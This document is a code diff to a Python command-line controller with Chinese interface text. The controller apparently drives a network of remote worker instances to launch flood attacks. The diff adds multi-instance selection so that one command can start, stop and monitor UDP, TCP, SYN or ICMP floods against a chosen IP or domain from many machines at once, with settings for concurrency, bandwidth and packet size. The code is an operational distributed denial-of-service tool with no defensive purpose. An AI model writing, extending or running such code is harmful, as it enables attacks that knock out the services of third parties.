@@ -95,6 +95,39 @@ def pick_instance(running_only=True):
 
 # ==================== 实例操作 ====================
 
+def pick_instances(running_only=True):
+    """多选实例，返回 list 或 None。支持: 序号 / all / 逗号分隔"""
+    d = _get("/api/instances", msg="获取实例列表")
+    ok, data = api.check(d)
+    if not ok:
+        _err(f"无法获取实例列表: {data}")
+        return None
+    insts = data.get("instances", [])
+    if running_only:
+        insts = [i for i in insts if i.get("status") in ("running", "starting", "restarting")]
+    if not insts:
+        console.print("  没有可用实例", style="dim")
+        return None
+    for idx, i in enumerate(insts):
+        console.print(f"  [{idx}] {i['id']} -> {i.get('url', '')} ({i.get('status', '')})")
+    console.print("  [all] 全部实例")
+    sel = _input("\n  选择（序号/all/逗号分隔多个，留空取消）: ")
+    if sel is None:
+        return None
+    if sel.lower() == "all":
+        return insts
+    try:
+        indices = [int(x.strip()) for x in sel.split(",")]
+        picked = [insts[i] for i in indices if 0 <= i < len(insts)]
+        if not picked:
+            _err("无效选择")
+            return None
+        return picked
+    except (ValueError, IndexError):
+        _err("无效选择")
+        return None
+
+
 def list_instances():
     d = _get("/api/instances")
     ok, data = api.check(d)
@@ -679,56 +712,102 @@ def resource_monitor():
 # ==================== 攻击操作 ====================
 
 def attack_start():
-    inst = pick_instance()
-    if not inst:
+    """发起攻击（支持多实例）"""
+    insts = pick_instances()
+    if not insts:
         return
     target = _input("  目标 IP/域名（留空取消）: ")
     if target is None:
         return
+    console.print("  [dim]类型: udp=UDP洪泛(免sudo) | tcp=TCP连接 | syn=SYN洪泛 | icmp=ICMP洪泛[/]")
     atype = _input("  类型（udp/tcp/syn/icmp，默认udp）: ") or "udp"
     port_str = _input("  端口（默认80）: ") or "80"
     dur_str = _input("  持续秒数（默认60）: ") or "60"
+    conc_str = _input("  并发数（默认100）: ") or "100"
+    bw_str = _input("  带宽限制KB/s（默认0=不限）: ") or "0"
+    pkt_str = _input("  包大小字节（默认1024）: ") or "1024"
     try:
-        port, dur = int(port_str), int(dur_str)
+        port, dur, conc = int(port_str), int(dur_str), int(conc_str)
+        bw, pkt = int(bw_str), int(pkt_str)
     except ValueError:
         _err("无效数字")
         return
-    d = _post_inst(inst["hostname"], "/api/attack/start",
-                      {"target": target, "type": atype, "port": port,
-                       "duration": dur, "token": config.TOKEN})
-    ok, data = api.check(d)
-    if ok:
-        _ok(data.get("msg", "已启动"))
-    else:
-        _err(data.get("error", data.get("msg", str(data))))
+    payload = {"target": target, "type": atype, "port": port,
+               "duration": dur, "concurrency": conc,
+               "bandwidth": bw, "packet_size": pkt, "token": config.TOKEN}
+    _info(f"在 {len(insts)} 个实例上发起 {atype} 攻击 -> {target}:{port} 持续{dur}s")
+    for inst in insts:
+        d = _post_inst(inst["hostname"], "/api/attack/start", payload, msg=f"在{inst['id']}发起攻击")
+        ok, data = api.check(d)
+        if ok:
+            _ok(f"{inst['id']}: {data.get('msg', '已启动')}")
+        else:
+            _err(f"{inst['id']}: {data.get('error', data.get('msg', str(data)))}")
 
 
 def attack_stop():
-    inst = pick_instance()
-    if not inst:
+    """停止攻击（支持多实例）"""
+    insts = pick_instances()
+    if not insts:
         return
-    d = _post_inst(inst["hostname"], "/api/attack/stop", {"token": config.TOKEN})
-    ok, data = api.check(d)
-    if ok:
-        _ok(data.get("msg", "已停止"))
-    else:
-        _err(data.get("msg", str(data)))
+    for inst in insts:
+        d = _post_inst(inst["hostname"], "/api/attack/stop", {"token": config.TOKEN}, msg=f"停止{inst['id']}")
+        ok, data = api.check(d)
+        if ok:
+            _ok(f"{inst['id']}: {data.get('msg', '已停止')}")
+        else:
+            _err(f"{inst['id']}: {data.get('msg', str(data))}")
 
 
 def attack_status():
-    inst = pick_instance()
-    if not inst:
-        return
-    d = _get_inst(inst["hostname"], "/api/attack/status")
+    """攻击状态（所有实例，rich 表格）"""
+    d = _get("/api/instances", msg="获取实例列表")
     ok, data = api.check(d)
     if not ok:
         _err(data)
         return
-    console.print(f"  运行: {data.get('running')} | 模式: {data.get('mode')} | 开始: {data.get('started_at')}")
-    stats = data.get("stats", {})
-    if stats:
-        console.print(f"  统计: {stats}")
-
+    insts = [i for i in data.get("instances", []) if i.get("status") in ("running", "starting", "restarting")]
+    if not insts:
+        console.print("  没有可用实例", style="dim")
+        return
+    t = Table(title="攻击状态（全部实例）", show_header=True, header_style="bold cyan")
+    t.add_column("实例", style="bold")
+    t.add_column("运行")
+    t.add_column("模式")
+    t.add_column("已持续")
+    t.add_column("统计")
+    has_running = False
+    for inst in insts:
+        d = _get_inst(inst["hostname"], "/api/attack/status", msg=f"查询{inst['id']}")
+        ok, sdata = api.check(d)
+        if not ok:
+            t.add_row(inst["id"], "[red]查询失败[/]", "-", "-", "-")
+            continue
+        running = sdata.get("running", False)
+        if running:
+            has_running = True
+        rstr = "[green]运行中[/]" if running else "[dim]未运行[/]"
+        mode = sdata.get("mode", "") or "-"
+        started = sdata.get("started_at")
+        if started and isinstance(started, (int, float)):
+            import time as _t
+            elapsed = int(_t.time() - started)
+            tstr = f"{elapsed}s"
+        else:
+            tstr = "-"
+        stats = sdata.get("stats", {})
+        sstr = ""
+        if stats:
+            parts = []
+            for k, v in stats.items():
+                parts.append(f"{k}={v}")
+            sstr = " ".join(parts)[:60]
+        else:
+            sstr = "-"
+        t.add_row(inst["id"], rstr, mode, tstr, sstr)
+    console.print(t)
+    if not has_running:
+        console.print("  [dim]当前无攻击在运行[/]")
 
 # ==================== 代理操作（通过 manager 查看 worker）====================
 
